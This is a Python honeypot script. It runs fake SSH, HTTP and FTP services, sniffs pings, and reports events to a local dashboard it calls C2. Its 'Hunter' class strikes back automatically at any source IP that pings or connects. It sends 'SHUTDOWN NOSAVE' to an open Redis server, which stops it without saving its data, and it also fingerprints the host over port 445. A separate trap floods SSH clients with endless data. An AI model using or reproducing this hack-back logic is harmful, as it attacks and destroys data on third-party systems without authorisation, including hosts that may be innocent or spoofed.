import socket
import threading
import time
import paramiko
import struct
import os
import sys
import json
from colorama import Fore, Style, init

# --- INITIALIZATION ---
init(autoreset=True)

# === CONFIGURATION ===
BIND_ADDR = '0.0.0.0'
PORTS = {
    2222: "SSH (Trap)",
    8080: "HTTP (Web Trap)",
    2121: "FTP (Fake File Server)",
    9999: "VANITY (Show-off)"
}

HOST_KEY = paramiko.RSAKey.generate(2048)

# === TELEMETRY C2 CLIENT ===
class C2Client:
    def __init__(self):
        self.targets = ['host.docker.internal', '172.17.0.1']
        self.port = 65000
        self.sock = None
        self.connected = False
        self.lock = threading.Lock()

    def connect(self):
        """Attempts to connect to the dashboard on known hosts."""
        for host in self.targets:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((host, self.port))
                self.sock = s
                self.connected = True
                # print(f"{Fore.GREEN}[+] Connected to C2 at {host}{Style.RESET_ALL}")
                return True
            except:
                pass
        self.connected = False
        return False

    def send_telemetry(self, type_str, message, details=None):
        """
        Sends formatted telemetry to C2. Falls back to console if disconnected.
        type_str: ALERT, INFO, WARNING, HIT, SYSTEM
        """
        # 1. Standard Console Output (Always runs)
        timestamp = time.strftime("%H:%M:%S")
        color = Fore.WHITE
        if type_str == "ALERT": color = Fore.RED
        elif type_str == "WARNING": color = Fore.YELLOW
        elif type_str == "INFO": color = Fore.CYAN
        elif type_str == "HIT": color = Fore.MAGENTA
        elif type_str == "SYSTEM": color = Fore.GREEN
        
        print(f"{color}[{timestamp}] [{type_str}] {message}{Style.RESET_ALL}")

        # 2. C2 Transmission
        payload = {
            "type": type_str,
            "msg": message,
            "timestamp": timestamp,
            "severity": "HIGH" if type_str in ["ALERT", "HIT"] else "LOW"
        }
        if details:
            payload.update(details)
        
        with self.lock:
            try:
                if not self.connected or not self.sock:
                    if not self.connect(): return
                
                data = json.dumps(payload) + "\n"
                self.sock.sendall(data.encode('utf-8'))
            except (BrokenPipeError, ConnectionResetError, OSError):
                # Connection lost, try to reconnect once
                self.sock = None
                self.connected = False
                if self.connect():
                    try:
                        self.sock.sendall(data.encode('utf-8'))
                    except: pass

    def handshake(self):
        self.send_telemetry("SYSTEM", "CHIMERA DEFENSE SYSTEM ONLINE", {"status": "ONLINE", "module": "CHIMERA_CORE"})

# Global C2 Instance
C2 = C2Client()

# === PACKET TRACKER (THE HAWK EYE) ===
class NetworkSniffer:
    def __init__(self):
        self.host = socket.gethostbyname(socket.gethostname())

    def start(self):
        try:
            if os.name == 'nt':
                socket_protocol = socket.IPPROTO_IP
                sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
                sniffer.bind((self.host, 0))
                sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            else:
                socket_protocol = socket.IPPROTO_ICMP
                sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
                sniffer.bind((BIND_ADDR, 0)) 
        
            C2.send_telemetry("INFO", "PACKET TRACKER ACTIVE: Sniffing for Pings & Scans...", {"component": "SNIFFER"})
        
            while True:
                raw_buffer = sniffer.recvfrom(65565)[0]
                ip_header = raw_buffer[0:20]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                s_addr = socket.inet_ntoa(iph[8])
                
                if s_addr == "127.0.0.1" or s_addr.startswith("172."): 
                    continue

                C2.send_telemetry("ALERT", f"SCAN DETECTED (ICMP/Ping) FROM: {s_addr}", {
                    "event": "SCAN_DETECTED",
                    "protocol": "ICMP",
                    "target": s_addr
                })
                
                Hunter(s_addr).engage()
                time.sleep(0.5)

        except PermissionError:
            print(f"{Fore.RED}[ERROR] Packet Tracker needs ROOT privileges!{Style.RESET_ALL}")
        except Exception as e:
            pass

# === ACTIVE DEFENSE UNIT (THE HUNTER) ===
class Hunter:
    def __init__(self, target_ip):
        self.target_ip = target_ip

    def detect_os(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            if s.connect_ex((self.target_ip, 445)) == 0:
                C2.send_telemetry("WARNING", f"HUNTER: OS DETECTION [WINDOWS] for {self.target_ip}", {
                    "event": "OS_FINGERPRINT",
                    "result": "WINDOWS",
                    "target": self.target_ip
                })
            s.close()
        except: pass

    def strike_redis(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((self.target_ip, 6379)) == 0:
                C2.send_telemetry("ALERT", f"HUNTER: REDIS OPEN on {self.target_ip}! EXECUTING KILL SWITCH...", {
                    "event": "COUNTER_ATTACK",
                    "method": "REDIS_SHUTDOWN",
                    "target": self.target_ip
                })
                s.send(b"SHUTDOWN NOSAVE\r\n")
                s.close()
        except: pass

    def engage(self):
        threading.Thread(target=self.detect_os).start()
        threading.Thread(target=self.strike_redis).start()

# === BLACK HOLE & FILE SYSTEM ===
def activate_black_hole(chan, filename):
    C2.send_telemetry("WARNING", f"ACTIVATING BLACK HOLE for file {filename}...", {"event": "TRAP_TRIGGERED", "trap": "BLACK_HOLE", "file": filename})
    chan.send(f"Preparing download: {filename} (Size: 850 GB)...\r\n")
    try:
        while True:
            chan.send(b'\x00' * 1024 * 1024)
            time.sleep(0.1) 
    except: pass

class VirtualFS:
    def __init__(self):
        self.cwd = "/root"
        self.files = {"/root": ["flag.txt", "passwords.db", "critical_backup.tar"], "/etc": ["passwd"]}
        self.file_content = {"flag.txt": "CTF{Scanning_Wont_Help_You}"}
        self.trap_files = ["critical_backup.tar", "passwords.db"]
    def list_dir(self): return "  ".join(self.files.get(self.cwd, [])) + "\n"
    def read_file(self, f): return self.file_content.get(f, "Error\n")

# === HANDLERS ===
class SSHHandler(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid): return paramiko.OPEN_SUCCEEDED
    def check_auth_password(self, u, p): return paramiko.AUTH_SUCCESSFUL
    def check_channel_shell_request(self, c): return True

def handle_ssh(client, addr):
    Hunter(addr[0]).engage()
    
    t = paramiko.Transport(client)
    t.add_server_key(HOST_KEY)
    server = SSHHandler()
    try: t.start_server(server=server)
    except: return
    chan = t.accept(20)
    if not chan: return

    fs = VirtualFS()
    chan.send(f"\r\nWelcome to Secure Core (Monitoring Active)\r\n\r\n")
    while True:
        try:
            chan.send(f"root@core:{fs.cwd}# ")
            cmd = ""
            while not cmd.endswith("\r"):
                r = chan.recv(1024); chan.send(r); cmd += r.decode("utf-8")
            cmd = cmd.strip(); chan.send("\r\n")
            if cmd == "exit": break
            if any(x in cmd for x in fs.trap_files) and ("cat" in cmd or "scp" in cmd):
                activate_black_hole(chan, "TRAP_FILE")
                break
            elif cmd == "ls": chan.send(fs.list_dir())
            else: chan.send("bash: command not found\r\n")
        except: break
    chan.close()

def start_service(port, name):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((BIND_ADDR, port))
    s.listen(100)
    print(f"{Fore.CYAN}[*] Listening on {port} ({name})...{Style.RESET_ALL}")
    while True:
        c, a = s.accept()
        C2.send_telemetry("HIT", f"HIT ON {name} from {a[0]}", {
            "event": "SERVICE_HIT",
            "service": name,
            "port": port,
            "source_ip": a[0]
        })
        if port == 2222: threading.Thread(target=handle_ssh, args=(c, a)).start()
        else: c.close()

# === MAIN ===
if __name__ == "__main__":
    C2.handshake() # Send STARTUP Handshake
    
    # 1. Packet Tracker
    sniffer = NetworkSniffer()
    t_sniff = threading.Thread(target=sniffer.start)
    t_sniff.daemon = True
    t_sniff.start()

    # 2. Trap Services
    threads = []
    for p, n in PORTS.items():
        t = threading.Thread(target=start_service, args=(p, n))
        t.start(); threads.append(t)
    for t in threads: t.join()